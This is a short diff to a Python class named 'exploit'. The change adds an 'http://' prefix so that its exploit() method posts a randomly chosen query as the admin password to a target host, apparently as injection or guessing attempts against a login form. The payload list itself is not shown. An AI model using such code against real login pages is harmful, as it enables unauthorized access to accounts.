@@ -24,7 +24,7 @@ class exploit(object):
 
     def exploit(self):
         query = random.choice(self.possible_queries)
-        requests.post(self.HOST,{"username":"admin","password":query})
+        requests.post(f"http://{self.HOST}",{"username":"admin","password":query})
 
 
     def _validate(self):
